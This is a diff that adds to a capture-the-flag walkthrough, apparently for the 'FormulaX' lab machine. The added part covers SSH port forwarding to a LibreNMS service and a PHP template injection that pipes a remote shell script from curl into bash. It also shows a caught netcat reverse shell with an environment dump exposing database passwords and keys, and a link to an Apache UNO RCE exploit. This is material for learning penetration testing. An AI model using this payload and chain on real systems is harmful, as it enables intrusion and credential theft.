@@ -160,7 +160,7 @@ Session completed.
                     
 ```
 `manchesterunited`
-
+![img 5](./img/img5.png)
 ```shell
 not required on a system that users do not log into.
 
@@ -171,7 +171,46 @@ user.txt
 frank_dorky@formulax:~$ cat user.txt          
 c734e98<************>47e0a07              
 frank_dorky@formulax:~$                                                      
-                                                                             
-                                                                             
-                                                                
 ```
+
+- Using `ss -tl` you see port 3000, this port can run the service vuln!. Using ssh reserve forwarding port `ssh -L 3000:127.0.0.1:3000 frank_dorky@10.10.11.6`. Goto this website.
+- enable console log in broswer, you see error. `echo "127.0.0.1 librenms.com" | sudo tee -a /etc/hosts` -> fix done!.  search internet you can see ![payload](https://www.sonarsource.com/blog/it-s-a-snmp-trap-gaining-code-execution-on-librenms/?utm_content=security&utm_medium=social&utm_source=twitter)
+
+```shell
+@php
+    system('curl http:<host>/shell.sh | bash >&2');
+@endphp
+
+
+-└─$ nc -lnvp 9999
+listening on [any] 9999 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.11.6] 48006
+bash: cannot set terminal process group (937): Inappropriate ioctl for device
+bash: no job control in this shell
+librenms@formulax:~$ env
+env
+DB_PASSWORD=mychemicalformulaX
+PWD=/opt/librenms
+NODE_ID=648b260eb18d2
+HOME=/opt/librenms
+APP_KEY=base64:jRoDTOFGZEO08+68w7EzYPp8a7KZCNk+4Fhh97lnCEk=
+DB_USERNAME=kai_relay
+DB_HOST=localhost
+USER=librenms
+SHLVL=3
+VAPID_PRIVATE_KEY=chr9zlPVQT8NsYgDGeVFda-AiD0UWIY6OW-jStiwmTQ
+DB_DATABASE=librenms
+VAPID_PUBLIC_KEY=BDhe6thQfwA7elEUvyMPh9CEtrWZM1ySaMMIaB10DsIhGeQ8Iks8kL6uLtjMsHe61-ZCC6f6XgPVt7O6liSqpvg
+_=/usr/bin/env
+librenms@formulax:~$ 
+
+```
+=> kai_replay = `mychemicalformulaX`
+- you see when run `sudo -l` -> office.sh, it call calc office though port 2002 exploit this
+
+github link: ![link exploit](https://github.com/sud0woodo/ApacheUNO-RCE/blob/master/uno-rce.py) 
+
+Image you can need!
+![img6](./img/img6.png)
+![img7](./img/img7.png)
+![img8](./img/img8.png)
